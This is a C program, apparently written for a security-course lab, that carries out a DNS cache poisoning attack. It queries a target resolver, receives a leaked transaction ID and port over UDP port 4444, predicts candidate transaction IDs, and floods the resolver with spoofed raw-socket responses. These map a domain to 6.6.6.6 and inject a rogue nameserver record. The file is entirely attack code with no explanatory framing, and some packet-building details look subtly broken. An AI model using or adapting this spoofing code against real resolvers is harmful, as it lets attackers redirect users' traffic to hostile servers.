#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ldns/ldns.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define TARGET_DNS_SERVER_IP "192.168.1.203"
#define DNS_SERVER_PORT 53
#define SPOOFED_RESPONSE_IP "6.6.6.6"
#define ATTACKER_PORT 4444
#define SPOOFED_SOURCE_IP "192.168.1.204"
#define MAX_PACKET_SIZE 512

#define DNS_RESPONSE_FLAGS_AUTH 0x85
#define DNS_RESPONSE_FLAGS_RECUR 0x80
#define DNS_TTL_SECONDS 600
#define DNS_CLASS_IN 0x01
#define DNS_TYPE_A 0x01
#define DNS_TYPE_NS 0x02

#define TXID_TAP_VALUE1 0x80000057
#define TXID_TAP_VALUE2 0x80000062
#define NUM_TXID_CANDIDATES 10
#define TXID_MSB_MASK 0x8000

#define IP_VERSION 4
#define IP_IHL 5
#define PACKET_TTL 64
#define RESPONSE_DELAY_MICROSECONDS 100000

void generate_txid_candidates(uint16_t current_txid, uint16_t candidates[NUM_TXID_CANDIDATES]) {
    uint32_t shifted_txid = current_txid >> 1;
    uint32_t base_value = shifted_txid ^ TXID_TAP_VALUE1 ^ TXID_TAP_VALUE2;
    
    candidates[0] = shifted_txid & 0xFFFF;
    candidates[1] = (0x8000 | shifted_txid) & 0xFFFF;
    
    uint32_t temp_val1, temp_val2;
    if (base_value % 2 == 0) {
        temp_val1 = base_value / 2;
        temp_val2 = (base_value / 2) ^ TXID_TAP_VALUE1 ^ TXID_TAP_VALUE2;
    } else {
        temp_val1 = (base_value >> 1) ^ TXID_TAP_VALUE1;
        temp_val2 = (base_value >> 1) ^ TXID_TAP_VALUE2;
    }
    
    for (int i = 0; i < 4; i++) {
        uint16_t prefix = i << 14;
        candidates[2 + i*2] = (prefix | (temp_val1 & 0x3FFF));
        candidates[3 + i*2] = (prefix | (temp_val2 & 0x3FFF));
    }
}

uint16_t calculate_packet_checksum(uint16_t *buffer, int size) {
    uint32_t checksum = 0;
    
    while (size > 1) {
        checksum += *buffer++;
        size -= 2;
    }
    
    if (size > 0) {
        checksum += *(uint8_t *)buffer;
    }
    
    while (checksum >> 16) {
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }
    
    return (uint16_t)(~checksum);
}

void send_initial_dns_query(const char *target_hostname, const char *dns_server_ip) {
    int socket_fd;
    struct sockaddr_in server_addr;
    ldns_pkt *dns_query;
    uint8_t *wire_format_query;
    size_t wire_format_length;

    socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd < 0) {
        perror("Failed to create socket for DNS query");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    if (inet_pton(AF_INET, dns_server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid DNS server IP address");
        close(socket_fd);
        exit(EXIT_FAILURE);
    }

    dns_query = ldns_pkt_query_new(
        ldns_dname_new_frm_str(target_hostname),
        DNS_TYPE_A,
        DNS_CLASS_IN,
        LDNS_RD
    );
    
    srand(time(NULL));
    ldns_pkt_set_id(dns_query, rand() % 65536);

    if (ldns_pkt2wire(&wire_format_query, dns_query, &wire_format_length) != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to convert DNS query to wire format\n");
        ldns_pkt_free(dns_query);
        close(socket_fd);
        exit(EXIT_FAILURE);
    }

    if (sendto(socket_fd, wire_format_query, wire_format_length, 0, 
               (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
    }

    free(wire_format_query);
    ldns_pkt_free(dns_query);
    close(socket_fd);
}

void receive_client_info(uint16_t *txid, uint16_t *port) {
    int socket_fd;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    char receive_buffer[MAX_PACKET_SIZE];

    socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd < 0) {
        perror("Failed to create socket for receiving client info");
        exit(EXIT_FAILURE);
    }

    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = INADDR_ANY;
    client_addr.sin_port = htons(ATTACKER_PORT);

    if (bind(socket_fd, (const struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        perror("Failed to bind socket");
        close(socket_fd);
        exit(EXIT_FAILURE);
    }

    int received_bytes = recvfrom(socket_fd, receive_buffer, MAX_PACKET_SIZE, 0, 
                                (struct sockaddr *)&client_addr, &client_addr_len);
    if (received_bytes < 0) {
        perror("Failed to receive client information");
        close(socket_fd);
        exit(EXIT_FAILURE);
    }

    sscanf(receive_buffer, "%hu %hu", txid, port);
    close(socket_fd);
}

void send_spoofed_dns_responses(int socket_fd, uint16_t base_txid, uint16_t target_port) {
    uint16_t txid_candidates[NUM_TXID_CANDIDATES];
    generate_txid_candidates(base_txid, txid_candidates);

    char packet_buffer[MAX_PACKET_SIZE];
    struct sockaddr_in target_addr;

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, TARGET_DNS_SERVER_IP, &target_addr.sin_addr);

    for (int i = 0; i < NUM_TXID_CANDIDATES; i++) {
        memset(packet_buffer, 0, MAX_PACKET_SIZE);

        struct iphdr *ip_header = (struct iphdr *)packet_buffer;
        ip_header->version = IP_VERSION;
        ip_header->ihl = IP_IHL;
        ip_header->tos = 0;
        ip_header->id = htonl(rand());
        ip_header->frag_off = 0;
        ip_header->ttl = PACKET_TTL;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->saddr = inet_addr(SPOOFED_SOURCE_IP);
        ip_header->daddr = inet_addr(TARGET_DNS_SERVER_IP);

        struct udphdr *udp_header = (struct udphdr *)(packet_buffer + sizeof(struct iphdr));
        udp_header->source = htons(DNS_SERVER_PORT);
        udp_header->dest = htons(target_port);

        uint8_t *dns_response = (uint8_t *)(packet_buffer + sizeof(struct iphdr) + sizeof(struct udphdr));

        dns_response[0] = (txid_candidates[i] >> 8) & 0xFF;
        dns_response[1] = txid_candidates[i] & 0xFF;
        dns_response[2] = DNS_RESPONSE_FLAGS_AUTH;
        dns_response[3] = DNS_RESPONSE_FLAGS_RECUR;
        dns_response[4] = 0x00; dns_response[5] = 0x01;
        dns_response[6] = 0x00; dns_response[7] = 0x01;
        dns_response[8] = 0x00; dns_response[9] = 0x01;
        dns_response[10] = 0x00; dns_response[11] = 0x01;

        uint8_t query_section[] = {
            0x03, 0x77, 0x77, 0x77,
            0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65,
            0x0B, 0x63, 0x79, 0x62, 0x65, 0x72, 0x63, 0x6f, 0x75, 0x72, 0x73, 0x65,
            0x03, 0x63, 0x6f, 0x6d, 0x00,
            0x00, 0x01,
            0x00, 0x01
        };
        memcpy(dns_response + 12, query_section, sizeof(query_section));

        uint8_t answer_section[] = {
            0xC0, 0x0C,
            0x00, 0x01,
            0x00, 0x01,
            0x00, 0x00, 0x02, 0x58,
            0x00, 0x04,
            0x06, 0x06, 0x06, 0x06
        };
        memcpy(dns_response + 12 + sizeof(query_section), answer_section, sizeof(answer_section));

        uint8_t authority_section[] = {
            0xC0, 0x18,
            0x00, 0x02,
            0x00, 0x01,
            0x00, 0x00, 0x02, 0x58,
            0x00, 0x05,
            0x02, 0x6e, 0x73,
            0xc0, 0x18, 0xc0, 0x49, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x58,
            0x00, 0x04, 0xc0, 0xa8, 0x01,
            0xcc, 0x00, 0x00, 0x29, 0x10,
            0x00, 0x00, 0x00, 0x80,
            0x00, 0x00, 0x00, 0x80
        };
        memcpy(dns_response + 12 + sizeof(query_section) + sizeof(answer_section), 
               authority_section, sizeof(authority_section));

        size_t total_length = sizeof(struct iphdr) + sizeof(struct udphdr) + 
                             12 + sizeof(query_section) + sizeof(answer_section) + 
                             sizeof(authority_section);
        ip_header->tot_len = htons(total_length);
        udp_header->len = htons(total_length - sizeof(struct iphdr));

        if (sendto(socket_fd, packet_buffer, total_length, 0, 
                  (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Failed to send spoofed DNS response");
        }
    }
}

int main() {
    uint16_t transaction_id, target_port;
    int raw_socket;

    // Send initial DNS query
    send_initial_dns_query("www.attacker.cybercourse.com", TARGET_DNS_SERVER_IP);

    // Get transaction ID and port from client
    receive_client_info(&transaction_id, &target_port);

    // Create raw socket for sending spoofed responses
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_socket < 0) {
        perror("Raw socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Wait before sending spoofed responses
    usleep(RESPONSE_DELAY_MICROSECONDS);

    send_spoofed_dns_responses(raw_socket, transaction_id, target_port);

    close(raw_socket);
    return 0;
}
